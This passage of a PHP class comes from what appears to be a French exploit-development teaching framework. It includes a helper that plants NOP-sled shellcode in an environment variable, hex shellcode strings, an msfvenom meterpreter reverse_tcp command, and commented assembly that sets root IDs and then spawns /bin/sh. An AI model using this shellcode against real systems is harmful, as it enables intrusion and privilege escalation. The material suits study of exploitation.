	    $elf2addr4ret = $this->req_ret_str($query);
	    
	    $this->article("SHELLCODE ADDR IN ENV VAR", $elf2addr4ret);
	    // elf2string4hex($elf2addr4ret,"979");
	    // elf2opcode4hex($elf2addr4ret);
	    /*
	     * $this->titre("Check If is Good Addr");
	     * $tmp = $this->req_ret_tab("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"x/100s $elf2addr4ret\" $this->file_path | grep shellcode | tail -1 | cut -d':' -f1 ");
	     * $elf2addr4ret = trim($tmp[0]);unset($tmp);
	     * $elf2addr4ret = dechex(hexdec($elf2addr4ret)+10); // 10 (shellcode=) +(nops)
	     * $elf2addr4ret = $this->hex2norme_32($elf2addr4ret);
	     * $this->article("ADDR Real SHELLCODE IN ENV VAR", $elf2addr4ret);
	     * elf2string4hex($elf2addr4ret,"979");
	     * elf2opcode4hex($elf2addr4ret);
	     * $this->requette("gdb -q --batch -ex \"b main\" -ex \"r AAAA\" -ex \"x/s $elf2addr4ret\" $this->file_path | tail -1 ");
	     * $this->pause();
	     */
	    
	    return $elf2addr4ret;
	}
	
	
	function shellcode2env4raw($nops,$shellcode_raw) {
		$this->ssTitre("PUT Shellcode in ENV");
		$shellcode_raw = trim($shellcode_raw);
		$shell = str_repeat("\x90", $nops);
		$shell .= $shellcode_raw;
		$this->cmd("localhost", "export shellcode=$shell");
		putenv("shellcode=$shell");
		$this->ssTitre("Check Shellcode in ENV");
		// article("Remarque","Shellcode doit etre en raw");
		$this->requette("env | grep 'shellcode' ");
	}
	
	
	
	

	function addr2hex($addr) {
		$addr = hex2norme_32($addr);
		return "\x$addr[2]$addr[3]\x$addr[4]$addr[5]\x$addr[6]$addr[7]\x$addr[8]$addr[9]";
	}
	
	
	
	
	public function addr2add($addr,$add){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) + $add)));
	}
	
	public function addr2add4dec($addr,$add){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) + $add)));
	}
	
	public function addr2add4hex($addr,$add){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) + hexdec($add))));
	}
	
	public function addr2sub($addr,$sub){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) - $sub)));
	}
	
	public function addr2sub4dec($addr,$sub){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) - $sub)));
	}
	
	public function addr2sub4hex($addr,$sub){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) - hexdec($sub))));
	}
	
	
	
	
	

	// $shellcode_hex = '\xda\xdf\xbd\xb2\x9a\x13\x3b\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x6e\x1a\x03\x6e\x1a\x83\xee\xfc\xe2\x47\xf0\x18\x63\x3e\x57\x79\xfb\x6d\x3b\x0c\x1c\x05\x94\x7d\x8b\xd5\x82\xae\x29\xbc\x3c\x38\x4e\x6c\x29\x32\x91\x90\xa9\x6c\xf3\xf9\xc7\x5d\x80\x91\x17\xf5\x35\xe8\xf9\x34\x39';
	// $shellcode_hex = "\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80";
	
	/*
	 * shellcode : est constitué d’opcode
	 *
	 * $user2local @$user2local -Compaq-610:~$ echo "obase=2; 23" | bc
	 * 10111
	 *
	 * msfvenom -p windows/meterpreter/reverse_tcp L=127.0.0.1 -f c | tr -d '"' | tr -d '\n'
	 * requette(" msfcli payload/windows/meterpreter/reverse_tcp_allports S");pause();
	 * // requette(" msfcli payload/windows/dllinject/reverse_tcp_allports S");pause();
	 * requette("msfpayload windows/messagebox EXITFUNC=process ICON=INFORMATION TEXT=\"Blabla\" ");pause();
	 * // session -l -v
	 * // screenshot
	 * // ps + migrate explorer.exe(PID)
	 * // 64Bits
	 * $bin_sh5 = <<<BIN_SH5
	 * xor rdx, rdx
	 * mov qword rbx, '//bin/sh'
	 * shr rbx, 0x8
	 * push rbx
	 * mov rdi, rsp
	 * push rax
	 * push rdi
	 * mov rsi, rsp
	 * mov al, 0x3b
	 * syscall
	 * BIN_SH5;
	 * prog_inst_test_nasm($bin_sh5,"64");
	 *
	 * the shellcode tries to obtain the base address of kernel32.dll using the PEB-based technique.
	 */
	
	
	
	
	
	
	
	



	

	
	// ===================================================================================
	
	// #################################### SHELLCODE #######################################################
	
	/*
	 *
	 *
	 *
	 * // ========================================================================
	 *
	 *
	 *
	 *
	 * // ========================================================================
	 *
	 * $write_asm2 = <<<WRT2
	 * section .text ; Text segment
	 * global _start ; Default entry point for ELF linking
	 * _start:
	 * ;_write
	 * xor %eax,%eax ; Pour éviter les segmentfaults
	 * xor %ebx,%ebx ; // //
	 * xor %ecx,%ecx ; // //
	 * xor %edx,%edx ; // //
	 *
	 * movb $0x9,%dl ; on place la taille de notre mot dans dl(edx) donc jonathan + \n | 8+1=9
	 * pushl $0x0a ; on commence à empiler notre line feed (\n) = 0x0a
	 * push $0x6e616874 ; naht
	 * push $0x616e6f6a ; onaj
	 * movl %esp,%ecx ; on envoie %esp dans %ecx le registre qui contient la constante char de _write
	 * movb $0x1,%bl ; ici 1 pour %ebx,
	 * movb $0x4,%al ; et ici le syscall de _write donc 4
	 * int $0x80 ; on exécute
	 *
	 * ;_exit
	 * xor %ebx,%ebx ; %ebx = 0
	 * movb $0x1,%al ; %eax = 1 (syscall de _exit)
	 * int $0x80 ; on exécute
	 * WRT2;
	 * system("echo \"$write_asm2\" > $dir_tmp/write_asm2.s");
	 * requette("cat -n $dir_tmp/write_asm2.s");
	 * prog_asm2object("$dir_tmp/write_asm2.s");
	 * prog_object2bin("$dir_tmp/write_asm2.o");
	 * requette("$dir_tmp/write_asm2");
	 * pause();
	 * requette("objdump -d $dir_tmp/write_asm2");
	 *
	 * // ============================================================================
	 *
	 * $write_asm8 = <<<WRT8
	 * int main()
	 * {
	 * asm(\"jmp appel_sous_routine
	 *
	 * sous_routine:
	 * popl %esi // Récupérer l'adresse de /bin/sh
	 * movl %esi,0x8(%esi) // L'écrire en première position de la table
	 * xorl %eax,%eax // Écrire NULL en seconde position de la table
	 * movl %eax,0xc(%esi)
	 * movb %eax,0x7(%esi) // Placer l'octet nul en fin de chaîne
	 * movb $0xb,%al // Fonction execve()
	 * movl %esi, %ebx // Chaîne à exécuter dans %ebx
	 * leal 0x8(%esi),%ecx // Table arguments dans %ecx
	 * leal 0xc(%esi),%edx // Table environnement dans %edx
	 * int $0x80 // Appel-système
	 *
	 * xorl %ebx,%ebx // Code de retour nul
	 * movl %ebx,%eax // Fonction _exit() : %eax = 1
	 * inc %eax
	 * int $0x80 // Appel-système
	 *
	 * appel_sous_routine:
	 * call sous_routine
	 * .string '/bin/sh'
	 * \");
	 * }
	 * WRT8;
	 * system("echo \"$write_asm8\" > $dir_tmp/write_asm8.c");
	 * requette("cat -n $dir_tmp/write_asm8.c");
	 * requette("gcc -o $dir_tmp/write_asm8 $dir_tmp/write_asm8.c;chmod +x $dir_tmp/write_asm8");
	 * requette("$dir_tmp/write_asm8");
	 * $shellcode_testo = shellcode_extract_from_bin_file("$dir_tmp/write_asm8");
	 * shellcode_test($shellcode_testo,"-m32");
	 * pause();
	 * ssTitre("les Octets Nuls");
	 * requette("objdump -d $dir_tmp/write_asm8");
	 * pause();
	 *
	 * // ============================================================================
	 *
	 *
	 * $write_asm8 = <<<WRT8
	 * jmp appel_sous_routine
	 *
	 * sous_routine:
	 * popl %esi ; Récupérer l'adresse de /bin/sh
	 * movl %esi,0x8(%esi) ; L'écrire en première position de la table
	 * xorl %eax,%eax ; Écrire NULL en seconde position de la table
	 * movl %eax,0xc(%esi)
	 * movb %eax,0x7(%esi) ; Placer l'octet nul en fin de chaîne
	 * movb $0xb,%al ; Fonction execve()
	 * movl %esi, %ebx ; Chaîne à exécuter dans %ebx
	 * leal 0x8(%esi),%ecx ; Table arguments dans %ecx
	 * leal 0xc(%esi),%edx ; Table environnement dans %edx
	 * int $0x80 ; Appel-système
	 *
	 * xorl %ebx,%ebx ; Code de retour nul
	 * movl %ebx,%eax ; Fonction _exit() : %eax = 1
	 * inc %eax
	 * int $0x80 ; Appel-système
	 *
	 * appel_sous_routine:
	 * call sous_routine
	 * .string '/bin/sh'
	 * WRT8;
	 * system("echo \"$write_asm8\" > $dir_tmp/write_asm8.s");
	 * requette("cat -n $dir_tmp/write_asm8.s");
	 * prog_asm2object("$dir_tmp/write_asm8.s");
	 * prog_object2bin("$dir_tmp/write_asm8.o");
	 * requette("$dir_tmp/write_asm8");
	 * pause();
	 * pause();
	 * requette("objdump -d $dir_tmp/write_asm8");
	 * pause();
	 *
	 * // ============================================================================
	 * $bin_sh2 = <<<BIN_SH2
	 * main:
	 * xorl %eax,%eax // Pour éviter les segmentfaults
	 * xorl %ebx,%ebx // Pour éviter les segmentfaults
	 * xorl %ecx,%ecx // Pour éviter les segmentfaults
	 * xorl %edx,%edx // Pour éviter les segmentfaults
	 *
	 * //On doit récupérer les arguments de execve :
	 * //ebx = "/bin/sh"
	 * //ecx = tab = {"/bin/sh",0}
	 * //edx = n°3: 0
	 *
	 * //De plus, eax = 11, le syscall
	 *
	 * //empile 0
	 * push %edx
	 *
	 * //On doit empiler "/bin/sh". Or on est sur la pile et sur une architecture x86.
	 * //Donc on doit empiler 4 octets par 4 octets, on rajoute donc un/.
	 * //De plus on doit empiler à l'envers, dans deux sens :
	 * // - dans le sens "4 derniers octets puis 4 premiers octets"
	 * // - dans le sens "tous les octets sont inversés"
	 * //on pushe donc en premier 'hs/n', puis 'ib//'
	 * push $0x68732f6e
	 * push $0x69622f2f
	 *
	 *
	 * //on récupère l'adresse de la chaîne
	 * mov %esp,%ebx
	 *
	 * //empile 0
	 * push %edx
	 *
	 * //empile l'adresse de l'adresse de la chaîne (c'est à dire tab)
	 * push %ebx
	 *
	 * //on récupère l'adresse de tab
	 * mov %esp,%ecx
	 *
	 * //exécute l'interruption
	 * mov $11,%al
	 * int $0x80
	 * BIN_SH2;
	 * requette("echo \"$bin_sh2\" > $dir_tmp/bin_sh2.s");
	 * prog_asm2object("$dir_tmp/bin_sh2.s");
	 * prog_object2bin("$dir_tmp/bin_sh2.o");
	 * requette("$dir_tmp/bin_sh2");
	 * pause();
	 * // ===============================================================================
	 * ssTitre("Sys CALL exit");
	 *
	 * remarque("Maintenant nous allons étudier l'appel système _exit.\nici _exit aura besoin du registre ebx pour y contenir un entier nous allons donc essayer de faire l'équivalent de exit(0);");
	 * article("N°"," Appel System de exit");
	 * requette("cat $unistd[0] | grep \"_exit\" | head -1");
	 * system("echo \"section .text\n\tglobal _start\n_start:\n\tmov eax,1\n\txor ebx,ebx\n\tint 0x80\n\" > $dir_tmp/exit.s");
	 * requette("cat $dir_tmp/exit.s");
	 *
	 * prog_asm2object("$dir_tmp/exit.s");
	 * prog_object2bin("$dir_tmp/exit.o");
	 * requette("$dir_tmp/exit");
	 *
	 *
	 * system("echo \"void main(){char *line = \\\"Hello World !\\\";write(1, line, strlen(line));exit(0);} \" > $dir_tmp/helloworld3.c");
	 * requette("cat $dir_tmp/helloworld3.c");
	 * requette("gcc -o $dir_tmp/helloworld3 $dir_tmp/helloworld3.c;chmod +x $dir_tmp/helloworld3");
	 * requette("$dir_tmp/helloworld3");
	 * pause();
	 *
	 *
	 * section .data ; Data segment
	 * msg db 'Hello, world!', 0x0a ; The string and newline char
	 * section .text ; Text segment
	 * global _start ; Default entry point for ELF linking
	 * _start:
	 * ; SYSCALL: write(1,msg, 14)
	 * mov eax, 4 ;Put 4 into eax, since write is syscall #4.
	 * mov ebx, 1 ;Put 1 into ebx, since stdout is 1.
	 * mov ecx, msg ;Put the address of the string into ecx.
	 * mov edx, 14 ;Put 14 into edx, since our string is 14 bytes.
	 * int 0x80 ;Call the kernel to make the system call happen.
	 * ; SYSCALL: exit(0)
	 * mov eax, 1 ; Put 1 into eax, since exit is syscall #1.
	 * mov ebx, 0 ; Exit with success.
	 * int 0x80 ; Do the syscall.
	 *
	 *
	 *
	 *
	 *
	 * $write_asm7 = <<<WRT7
	 * global _start ; Default entry point for ELF linking
	 * _start:
	 * ; write(1, 'hello, world!', 14)
	 * push word 0x0a21
	 * push 0x646c726f
	 * push 0x77202c6f
	 * push 0x6c6c6568
	 * mov ecx, esp
	 * push byte 4
	 * pop eax
	 * push byte 1
	 * pop ebx
	 * push byte 14
	 * pop edx
	 * int 0x80
	 * ; exit(0)
	 * mov eax, ebx
	 * xor ebx, ebx
	 * int 0x80
	 * WRT7;
	 * system("echo \"$write_asm7\" > $dir_tmp/write_asm7.s");
	 * requette("cat -n $dir_tmp/write_asm7.s");
	 * ascii2hex('hello, world!');
	 * pause();
	 * prog_asm2object("$dir_tmp/write_asm7.s");
	 * prog_object2bin("$dir_tmp/write_asm7.o");
	 * requette("$dir_tmp/write_asm7");
	 * pause();
	 * ssTitre("les Octets Nuls");
	 * requette("objdump -d $dir_tmp/write_asm7");
	 * pause();
	 *
	 *
	 *
	 * system("echo \"void main(){shellcode();}void shellcode(){system(\\\"/bin/sh\\\");}\" > $dir_tmp/bin_sh.c");
	 * requette("cat $dir_tmp/bin_sh.c");
	 * requette("gcc -m32 -o $dir_tmp/bin_sh $dir_tmp/bin_sh.c;chmod +x $dir_tmp/bin_sh");
	 * requette("$dir_tmp/bin_sh");
	 * pause();
	 * $programme = "$dir_tmp/bin_sh";
	 * pause();
	 * requette("strace -s 999 -v -f $dir_tmp/bin_sh");
	 * pause();
	 *
	 *
	 *
	 * $bin_sh3 = <<< BIN_SH3
	 * global _start ; Default entry point for ELF linking
	 * _start:
	 * ; setresuid(uid_t ruid, uid_t euid, uid_t suid);
	 * xor eax, eax ; zero out eax
	 * xor ebx, ebx ; zero out ebx
	 * xor ecx, ecx ; zero out ecx
	 * cdq ; zero out edx using the sign bit from eax
	 * mov BYTE al, 0xa4 ; syscall 164 (0xa4)
	 * int 0x80 ; setresuid(0, 0, 0) restore all root privs
	 *
	 * ; execve(const char *filename, char *const argv [], char *const envp[])
	 * push BYTE 11 ; push 11 to the stack
	 * pop eax ; pop dword of 11 into eax
	 * push ecx ; push some nulls for string termination
	 * push 0x68732f2f ; push "//sh" to the stack
	 * push 0x6e69622f ; push "/bin" to the stack
	 * mov ebx, esp ; put the address of "/bin//sh" into ebx, via esp
	 * push ecx ; push 32-bit null terminator to stack
	 * mov edx, esp ; this is an empty array for envp
	 * push ebx ; push string addr to stack above null terminator
	 * mov ecx, esp ; this is the argv array with string ptr
	 * int 0x80 ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
	 * BIN_SH3;
	 * system("echo \"$bin_sh3\" > $dir_tmp/bin_sh3.s");
	 *
	 * requette("cat -n $dir_tmp/bin_sh3.s");
	 * prog_asm2object("$dir_tmp/bin_sh3.s");
	 * prog_object2bin("$dir_tmp/bin_sh3.o");
	 * requette("$dir_tmp/bin_sh3");
	 * $shellcode_bin_sh = shellcode_bin2hex("$dir_tmp/bin_sh3") ;
	 * shellcode_test($shellcode_bin_sh,"-m32");
	 * requette("objdump -d $dir_tmp/bin_sh3");
	 * pause();
	 *
	 *
	 * $bin_sh4 = <<< BIN_SH4
	 * section .data
	 * name db '/bin/sh', 0
	 * section .text
	 * global _start
	 * _start:
	 * ; setreuid(0, 0)
	 * mov eax, 70
	 * mov ebx, 0
	 * mov ecx, 0
	 * int 0x80
	 * ; execve('/bin/sh',['/bin/sh', NULL], NULL)
	 * mov eax, 11
	 * mov ebx, name
	 * push 0
	 * push name
	 * mov ecx, esp
	 * mov edx, 0
	 * int 0x80
	 * BIN_SH4;
	 * system("echo \"$bin_sh4\" > $dir_tmp/bin_sh4.s");
	 * requette("cat -n $dir_tmp/bin_sh4.s");
	 * prog_asm2object("$dir_tmp/bin_sh4.s");
	 * prog_object2bin("$dir_tmp/bin_sh4.o");
	 * requette("$dir_tmp/bin_sh4");
	 * $shellcode_bin_sh = shellcode_bin2hex("$dir_tmp/bin_sh4") ;
	 * shellcode_test($shellcode_bin_sh,"-m32");
	 * requette("objdump -d $dir_tmp/bin_sh4");
	 * pause();
	 *
	 * $bin_sh5 = <<<BIN_SH5
	 * global _start
	 * _start:
	 * ; setreuid(0, 0)
	 * mov eax, 70
	 * mov ebx, 0
	 * mov ecx, 0
	 * int 0x80
	 * jmp two
	 * one:
	 * ; execve('/bin/sh',['/bin/sh', NULL], NULL)
	 * mov eax, 11
	 * pop ebx
	 * push 0
	 * push ebx
	 * mov ecx, esp
	 * mov edx, 0
	 * int 0x80
	 * two:
	 * call one
	 * db '/bin/sh', 0
	 * BIN_SH5;
	 * system("echo \"$bin_sh5\" > $dir_tmp/bin_sh5.s");
	 * requette("cat -n $dir_tmp/bin_sh5.s");
	 * prog_asm2object("$dir_tmp/bin_sh5.s");
	 * prog_object2bin("$dir_tmp/bin_sh5.o");
	 * requette("$dir_tmp/bin_sh5");
	 * $shellcode_bin_sh = shellcode_bin2hex("$dir_tmp/bin_sh5") ;
	 * shellcode_test($shellcode_bin_sh,"-m32");
	 * requette("objdump -d $dir_tmp/bin_sh5");
	 * pause();
	 *
	 *
	 */
	
	// ##################################################################################################
	
	
}	
	
